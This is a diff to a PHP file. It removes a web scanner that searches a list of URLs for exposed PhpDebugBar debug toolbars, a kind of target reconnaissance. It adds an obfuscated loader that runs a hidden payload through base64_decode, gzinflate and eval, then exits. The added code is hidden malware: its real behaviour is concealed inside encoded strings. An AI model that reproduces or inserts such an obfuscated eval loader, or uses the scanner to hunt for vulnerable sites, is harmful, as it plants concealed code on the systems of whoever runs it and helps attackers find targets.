@@ -1,51 +1,6 @@
 <?php
-$filename = $argv[1]; 
- 
-$urls = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
- 
-echo "\n========== MUTAZI WEB SCANNER ==========\n\n";
- 
-function isInternetConnected()
-{
-    $connected = @fsockopen("www.google.com", 80);
-    if ($connected) {
-        fclose($connected);
-        return true;
-    }
-    return false;
-}
- 
-if (isInternetConnected()) {
-    echo "\nSuccess Connected Google!... \n\n";
- 
-	foreach ($urls as $url) {
-    $html = file_get_contents($url);
-    $keyword = 'var phpdebugbar = new PhpDebugBar.DebugBar();';
-    $found = strpos($html, $keyword);
- 
-    echo "•> " . $url;
- 
-    if ($found !== false) {
-        echo "   ";
-        sleep(1);
-        echo "===[LIVE]===\n";
-        sleep(1);
- 
-        $result = $url . "\n";
-        $filename = 'result-' . date('Y-m-d') . '.txt';
- 
-        // Menyimpan hasil ke file
-        file_put_contents($filename, $result, FILE_APPEND);
-    } else {
-        echo "\n";
-        sleep(1);
-    }
-}
- 
-sleep(1);
-echo "\n========== PROSES SCAN TELAH SELESAI ==========\n";
- 
- 
-} else {
-    echo "\n===[ Pastikan Internet Terhubung ]===\n";
-}
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "84infv4JTrxdgo\x61wfm\x42OW/R4RPsQZHg1JwiggNge/L7dIlr\x43\x417i\x430GrT8Pqk0\x613T11jjmZHwf\x62KziHWM8pOX2epx0Weh9\x62pypqGF6\x2bmXg\x2bf9ng\x43\x4157mvzzhsU3dLXJQr2pWS0\x2bhkOplUSDNW2xw0Ink\x41DdvuzlMHD/5nr5E0HKeGvyvn0y2HwqX71J\x41h\x62zgmHM2KEdTtmx5pEZpE/zViQmHDqG\x62ptonMWwj49z\x63xemKOKrV\x62XsO6GinDtg\x43v2W2FJ4NGiqOTqnlQ\x42f2GgR\x42YoMw593v/N\x63D1Wt\x2bHt/5zWQV\x2b\x43e\x2bTkY\x41m\x42Wn\x61\x6249iqPTI32yz/SMrK\x41OgPy\x62t\x62f\x41X\x628gUGIknSPf5Ue1nOo\x2bJ1F/F\x43S\x43\x43dNpwL\x2bWOKOL7ERd9O\x2bFkkj\x434\x2bmoEM\x43jyi9GJr\x42UYGeG4K4h\x42xMMnEG1\x42jdKrf8RsXUJ/\x42K6h98\x63GHGhyfqsHy\x437\x43EQ\x41YiYoT20R7xqsMOeS5Kh\x61P5dDoGPZy\x411Sve/hS3TkRG2m0W\x61sVtmVXS4zo0mGzTlf\x43GVtGPWSGP5\x6337FNuS\x41jQRxNUG\x42Ui3li\x41SFpI\x41FXqUK6SksrxGOjp\x61upv\x427m\x634y1\x62M55fY6hOysEKooEM1\x61xGeL96TuVmP3yd/5m0vO8Ymm7mKfOTxjd5m/QujnZ3f9grxofEnTDuLHQq53huQMexFf62kVj\x41w8I\x63Smxp\x614Y34/5o\x2bPfOM/\x63\x62P7F\x42ZRTympe6vY9nl\x2b7Q\x62ZpEILPy3UxditLELpuKqRi4D5GWFtVd\x42vVzr\x41Wy\x43E\x42M/Hsr9\x42\x42Q\x62r22TVX/ELwO\x42wJe9nr\x41GFQ/0KwS\x42wJe9nq\x41WFQ/kKwW\x42wJe9np\x41mFQ/UKw\x61\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
+?>
